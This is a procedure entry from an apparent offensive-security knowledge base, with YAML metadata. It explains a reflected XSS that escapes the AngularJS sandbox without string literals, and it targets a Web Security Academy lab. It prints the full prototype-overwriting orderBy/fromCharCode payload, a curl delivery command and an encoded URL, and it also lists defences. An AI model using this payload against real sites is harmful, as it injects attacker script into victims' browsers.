---
id: fa2719cb-f7a8-40b7-bf49-3b8443e7ef21
name: Reflected-XSS-With-AngularJS-Sandbox-Escape-Without-Strings
type: procedure
verified: true
submitted: true
created_at: '2020-08-27T08:21:03.538584+00:00'
updated_at: '2023-05-26T01:10:41.520544+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/injection]]'
  - '[[tags/owasp]]'
  - '[[tags/owasp top 10]]'
  - '[[tags/Reflected XSS]]'
  - '[[tags/Web Applications]]'
  - xss
  - angularjs
  - sandbox-escape
commands:
  - '[[commands/curl-deliver-angularjs-xss-payload]]'
platforms:
  - Web
tools: []
validated: true
---

# Reflected-XSS-With-AngularJS-Sandbox-Escape-Without-Strings

## Summary

This procedure demonstrates how to exploit a reflected XSS vulnerability in an AngularJS application that restricts string usage and $eval to enforce a sandbox. By leveraging toString() to construct strings without quotes, overwriting the charAt prototype, and using the orderBy filter with fromCharCode, an attacker can bypass the sandbox and execute arbitrary JavaScript, such as triggering an alert.

## Description

AngularJS applications often implement sandboxes to prevent XSS by avoiding direct eval() usage and blocking string literals in expressions. This technique escapes the sandbox by using toString() to create strings dynamically, modifying the String prototype's charAt method to [][].join (which bypasses blacklists), and then using orderBy with a constructed predicate containing fromCharCode-generated characters to form and execute code like 'x=alert(1)'. This is effective against reflected XSS where user input is processed through AngularJS filters without proper sanitization. The target is typically a web search parameter that reflects input into an AngularJS context.

## Requirements

1. Access to a vulnerable web application with reflected XSS in an AngularJS context (e.g., a search parameter).
2. Browser developer tools or a proxy like Burp Suite to inspect and modify requests.
3. Knowledge of the target's URL structure, including the reflected parameter (e.g., ?search=).
4. No administrative privileges required; works from an unauthenticated position.

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs before processing in AngularJS expressions, using Angular's built-in $sce service or strict contextual escaping.
- Disable or upgrade AngularJS to versions without known sandbox bypasses (post-1.6.0 with strict mode).
- Implement Content Security Policy (CSP) to block inline scripts and eval.
- Monitor for anomalous JavaScript execution via Web Application Firewall (WAF) rules targeting orderBy and fromCharCode patterns.
- Enable client-side debugging to log AngularJS expression evaluations.

## Objectives

1. Identify AngularJS usage and sandbox restrictions in the reflected input.
2. Construct a payload that bypasses string restrictions using prototype pollution and filter abuse.
3. Deliver the payload to execute arbitrary JavaScript on the victim's browser.
4. Verify execution through a simple alert or data exfiltration.

## Instructions

### Step 1: Identify Reflected Parameter and AngularJS Context

**Context**: Confirm the vulnerability by testing a benign input and inspecting how it's reflected, ensuring AngularJS processes it without $eval but with filters like orderBy.

Navigate to the search functionality and input an alphanumeric string like '1'. View the page source or use browser developer tools to observe AngularJS bindings.

**Expected Output**: Input reflected in the response, with AngularJS directives visible (e.g., ng-repeat or filters) but no direct $eval.

### Step 2: Craft Sandbox Escape Payload

**Context**: Build the payload to create strings without quotes, pollute the String prototype, and use orderBy to execute code via fromCharCode.

Use the following payload structure in the search parameter:

`toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=`

This decodes to overwriting charAt with [].join, then ordering an array with a predicate that constructs 'x=alert(1)' using character codes (120=x, 61==, etc.).

Refer to the code snippet [[codes/AngularJS-Sandbox-Escape-Payload-Without-Strings]] for the exact JavaScript expression.

**Expected Output**: Payload ready for URL encoding and insertion.

### Step 3: Deliver and Execute Payload

**Context**: Send the crafted payload via the reflected parameter to trigger execution in the AngularJS context.

Use [[commands/curl-deliver-angularjs-xss-payload]] to simulate delivery:

```bash
curl -G "https://your-lab-id.web-security-academy.net/" --data-urlencode "search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)="
```

In a browser, load the full URL: https://your-lab-id.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=

**Expected Output**: An alert popup with '1' or equivalent JavaScript execution indicator.
